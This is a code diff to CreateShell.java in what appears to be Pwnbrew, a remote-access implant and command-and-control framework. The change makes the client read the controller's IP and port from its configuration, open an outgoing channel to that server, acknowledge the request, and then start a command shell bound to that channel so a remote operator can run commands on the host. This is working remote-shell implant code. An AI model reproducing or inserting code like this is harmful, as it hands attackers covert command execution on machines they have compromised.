@@ -45,24 +45,24 @@ The copyright on this package is held by Securifera, Inc
 
 package pwnbrew.network.control.messages;
 
-import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.logging.Level;
-import pwnbrew.log.RemoteLog;
-import pwnbrew.log.LoggableException;
+import pwnbrew.ClientConfig;
+import pwnbrew.concurrent.LockListener;
+import pwnbrew.manager.DataManager;
+import pwnbrew.manager.OutgoingConnectionManager;
 import pwnbrew.manager.PortManager;
-import pwnbrew.misc.Constants;
+import pwnbrew.utilities.Constants;
+import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.ControlOption;
 import pwnbrew.network.shell.Shell;
-import pwnbrew.network.shell.ShellMessageManager;
 
 /**
  *
  *  
  */
-public final class CreateShell extends ControlMessage{
+public final class CreateShell extends ControlMessage implements LockListener {
 
     private String[] cmdString;
     private String encoding;
@@ -73,6 +73,8 @@ public final class CreateShell extends ControlMessage{
     private static final byte OPTION_ENCODING = 20;
     public static final byte OPTION_STARTUP_CMD = 22;
     public static final byte OPTION_REDIRECT_STDERR = 24;
+    
+    private int lockVal = 0;
     
     //Class name
     private static final String NAME_Class = CreateShell.class.getSimpleName();
@@ -85,6 +87,41 @@ public final class CreateShell extends ControlMessage{
     */
     public CreateShell( byte[] passedId ) {
         super( passedId );
+    }
+    
+    //===============================================================
+    /**
+     * 
+     * @param lockOp 
+     */
+    @Override
+    public synchronized void lockUpdate(int lockOp) {
+        lockVal = lockOp;
+        notifyAll();
+    }
+    
+    //===============================================================
+    /**
+     * 
+     * @return  
+     */
+    @Override
+    public synchronized int waitForLock() {
+        
+        int retVal;        
+        while( lockVal == 0 ){
+            try {
+                wait();
+            } catch (InterruptedException ex) {
+                continue;
+            }
+        }
+        
+        //Set to temp and reset
+        retVal = lockVal;
+        lockVal = 0;
+        
+        return retVal;
     }
     
     //=========================================================================
@@ -151,27 +188,35 @@ public final class CreateShell extends ControlMessage{
     @Override
     public void evaluate( PortManager passedManager ) { 
         
-        try {
-            
-            ShellMessageManager aShellMsgManager = ShellMessageManager.getShellMessageManager();
-            if( aShellMsgManager == null ){
-                aShellMsgManager = ShellMessageManager.initialize( passedManager );
-            }
-            
-            int theClientId = getSrcHostId();
-            Shell aShell = aShellMsgManager.getShell( theClientId );
-            if( aShell == null){            
-            
-                aShell = new Shell( Constants.Executor, passedManager, theClientId, encoding, 
-                        cmdString, startupCmd, redirectStderr );
-                aShell.start();                
+        ClientConfig theConf = ClientConfig.getConfig();
+        int socketPort = theConf.getSocketPort();
+        String serverIp = theConf.getServerIp();
+        
+        //Get the port router
+        ClientPortRouter aPR = (ClientPortRouter) passedManager.getPortRouter( socketPort );
+        int theClientId = getSrcHostId();
 
-                //Register the shell
-                aShellMsgManager.setShell( theClientId, aShell );
-            }
+        int retChannelId = aPR.ensureConnectivity( serverIp, socketPort, this );   
+        if(retChannelId != 0 ){
             
-        } catch(IOException | LoggableException ex ){
-            RemoteLog.log( Level.SEVERE, NAME_Class, "evaluate", ex.getMessage(), null);        
+            //Send ack back to set channel id
+//            ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
+//            if( aCMManager != null ){
+                CreateShellAck retMsg = new CreateShellAck( retChannelId );
+                retMsg.setDestHostId( theClientId );
+                DataManager.send(passedManager, retMsg);
+//                aCMManager.send(retMsg); 
+//            }
+
+            //Create the shell and set it
+            Shell aShell = new Shell( Constants.Executor, passedManager, 
+                    theClientId, retChannelId, encoding, cmdString, startupCmd, redirectStderr );
+            aShell.start();                
+
+            //Register the shell
+            OutgoingConnectionManager aOCM = aPR.getConnectionManager();
+            aOCM.setShell( retChannelId, aShell );
+
         }
         
     }
